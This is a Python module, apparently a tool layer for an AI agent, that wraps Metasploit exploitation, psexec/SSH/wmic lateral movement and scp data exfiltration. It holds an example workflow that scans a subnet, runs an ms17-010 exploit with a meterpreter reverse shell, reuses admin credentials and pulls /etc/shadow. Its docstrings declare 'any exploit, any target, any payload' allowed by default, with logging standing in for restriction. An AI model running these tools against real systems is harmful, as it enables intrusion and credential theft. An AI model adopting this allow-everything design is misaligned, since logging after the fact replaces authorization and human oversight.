"""Arsenal tools with IDE workspace model.

Philosophy: ALLOW by default (like IDE)
- Full filesystem access (in workspace)
- Full network access (logged)
- Full process execution (recorded)
- Everything tracked, auditable, reversible

Like VS Code: you can do anything, but it's all in the change history.
"""

from __future__ import annotations

import logging
from pathlib import Path

from tools.arsenal_workspace import (
    ArsenalWorkspace,
    run_arsenal_operation,
    get_arsenal_workspace,
)

logger = logging.getLogger(__name__)


# =============================================================================
# DESTRUCTIVE OPERATIONS (Full access, tracked)
# =============================================================================

def metasploit_exploit(
    target: str,
    exploit: str,
    payload: str,
    **kwargs
) -> dict:
    """Execute Metasploit exploit with full workspace access.

    ALLOWED: Any exploit, any target, any payload.
    TRACKED: Every step is recorded.
    REVERSIBLE: Snapshot before, rollback if needed.

    Like using Metasploit in VS Code - you have full power,
    but everything is in the workspace history.
    """

    def execute(ws: ArsenalWorkspace):
        # Create workspace structure
        ws.create_file("exploit_config.txt", f"""
Target: {target}
Exploit: {exploit}
Payload: {payload}
""")

        # Execute metasploit
        result = ws.execute_command([
            "msfconsole", "-q",
            "-x", f"use {exploit}; "
                 f"set RHOST {target}; "
                 f"set PAYLOAD {payload}; "
                 f"set LHOST 127.0.0.1; "
                 f"set LPORT 4444; "
                 f"exploit"
        ])

        # Save results
        if result["success"]:
            ws.create_file("exploit_success.txt", result["stdout"])
        else:
            ws.create_file("exploit_failed.txt", result["stderr"])

        return {
            "target": target,
            "exploit": exploit,
            "payload": payload,
            "success": result["success"],
            "tracked": True,
            "reversible": True,
        }

    return run_arsenal_operation("metasploit_exploit", execute)


def lateral_move(
    target: str,
    technique: str = "psexec",
    credentials: dict | None = None,
    **kwargs
) -> dict:
    """Lateral movement with full access, fully tracked.

    ALLOWED: Any technique, any target.
    TRACKED: Connection details, commands, results.
    REVERSIBLE: Full operation logged for rollback.
    """

    def execute(ws: ArsenalWorkspace):
        # Document the operation
        ws.create_file("lateral_config.txt", f"""
Target: {target}
Technique: {technique}
User: {credentials.get('username', 'N/A')}
""")

        # Execute lateral movement
        if technique == "ssh":
            cmd = ["ssh", f"user@{target}", "id"]
        elif technique == "psexec":
            cmd = ["impacket-psexec", f"user@{target}"]
        else:
            cmd = ["wmic", "/node:", target, "process call create cmd"]

        result = ws.execute_command(cmd)

        # Track network operation
        ws.network_operation(target, 22 if technique == "ssh" else 445, technique)

        # Save connection details
        ws.create_file("lateral_result.txt",
                      f"Connected: {result['success']}\n{result['stdout']}")

        return {
            "target": target,
            "technique": technique,
            "success": result["success"],
            "logged": True,
            "reversible": True,
        }

    return run_arsenal_operation("lateral_move", execute)


def exfil_data(
    target: str,
    data_type: str = "files",
    source: str | None = None,
    **kwargs
) -> dict:
    """Data exfiltration with full tracking.

    ALLOWED: Any data, any source.
    TRACKED: What data, when, from where, to where.
    REVERSIBLE: Full exfil logged, can see what left.
    """

    def execute(ws: ArsenalWorkspace):
        # Create exfil directory
        exfil_dir = ws.workspace_dir / "exfil"
        exfil_dir.mkdir(exist_ok=True)

        # Log exfil operation
        ws.create_file("exfil_config.txt", f"""
Target: {target}
Type: {data_type}
Source: {source}
Timestamp: {__import__('datetime').datetime.now().isoformat()}
""")

        # Simulate data extraction
        cmd = ["scp", f"user@{target}:{source}", str(exfil_dir)]
        result = ws.execute_command(cmd, cwd="exfil")

        # Track network exfil
        ws.network_operation(target, 22, f"exfil_{data_type}")

        # Create manifest
        exfil_files = list(exfil_dir.rglob("*"))
        ws.create_file("exfil_manifest.txt",
                      f"Exfiltrated {len(exfil_files)} items\n"
                      f"Total: {sum(f.stat().st_size for f in exfil_files if f.is_file())} bytes")

        return {
            "target": target,
            "data_type": data_type,
            "items_exfil": len(exfil_files),
            "logged": True,
            "reversible": True,
        }

    return run_arsenal_operation("exfil_data", execute)


# =============================================================================
# WORKSPACE OPERATIONS (IDE-like)
# =============================================================================

def create_snapshot(name: str, description: str = "") -> dict:
    """Create workspace snapshot (like Git commit)."""
    workspace = get_arsenal_workspace()
    snap = workspace.snapshot(name, description)

    return {
        "snapshot": name,
        "timestamp": snap.timestamp.isoformat(),
        "description": description,
        "changes": snap.changes_count,
        "hash": snap.file_hash[:16] + "...",
    }


def list_snapshots() -> dict:
    """List all workspace snapshots (operation history)."""
    workspace = get_arsenal_workspace()

    return {
        "snapshots": [
            {
                "name": snap.name,
                "timestamp": snap.timestamp.isoformat(),
                "description": snap.description,
                "changes": snap.changes_count,
            }
            for snap in workspace.snapshots.values()
        ]
    }


def rollback_to_snapshot(snapshot_name: str) -> dict:
    """Rollback workspace to previous state (undo)."""
    workspace = get_arsenal_workspace()

    success = workspace.rollback(snapshot_name)

    return {
        "snapshot": snapshot_name,
        "rolled_back": success,
        "workspace_restored": success,
    }


def get_operation_history(limit: int = 50) -> dict:
    """Get operation history (full changelog)."""
    workspace = get_arsenal_workspace()
    history = workspace.get_history(limit)

    return {
        "operations": history[-limit:],
        "total_operations": len(workspace.changes),
    }


def get_workspace_diff(snapshot_name: str) -> dict:
    """Get diff between current and snapshot state."""
    workspace = get_arsenal_workspace()
    return workspace.get_diff(snapshot_name)


def get_workspace_status() -> dict:
    """Get current workspace status."""
    workspace = get_arsenal_workspace()

    # Count files
    files = list(workspace.workspace_dir.rglob("*"))
    file_count = len([f for f in files if f.is_file()])
    total_size = sum(f.stat().st_size for f in files if f.is_file())

    return {
        "files": file_count,
        "total_size_mb": total_size / (1024 * 1024),
        "snapshots": len(workspace.snapshots),
        "latest_snapshot": max(workspace.snapshots.keys()) if workspace.snapshots else None,
        "changes_since_snapshot": len(workspace.changes),
    }


# =============================================================================
# EXAMPLE WORKFLOWS
# =============================================================================

def full_arsenal_operation() -> dict:
    """Example: Full attack workflow with tracking."""
    workspace = get_arsenal_workspace()

    # Take initial snapshot
    create_snapshot("before_operation", "Clean state")

    # Phase 1: Reconnaissance
    with workspace.track_operation("recon"):
        workspace.execute_command(["nmap", "-sV", "10.0.0.0/24"])
        workspace.create_file("recon/targets.txt", "10.0.0.5\n10.0.0.10\n")

    # Phase 2: Exploitation
    metasploit_exploit(
        target="10.0.0.5",
        exploit="windows/smb/ms17-010",
        payload="windows/meterpreter/reverse_tcp"
    )

    # Phase 3: Lateral movement
    lateral_move(
        target="10.0.0.5",
        technique="psexec",
        credentials={"username": "admin", "password": "password"}
    )

    # Phase 4: Data exfiltration
    exfil_data(
        target="10.0.0.5",
        data_type="files",
        source="/etc/shadow"
    )

    # Take final snapshot
    create_snapshot("after_operation", "Operation complete")

    # Get diff
    diff = get_workspace_diff("before_operation")

    return {
        "workflow": "full_arsenal_operation",
        "phases": ["recon", "exploit", "lateral", "exfil"],
        "changes": diff,
        "history": get_operation_history(10),
        "status": get_workspace_status(),
    }
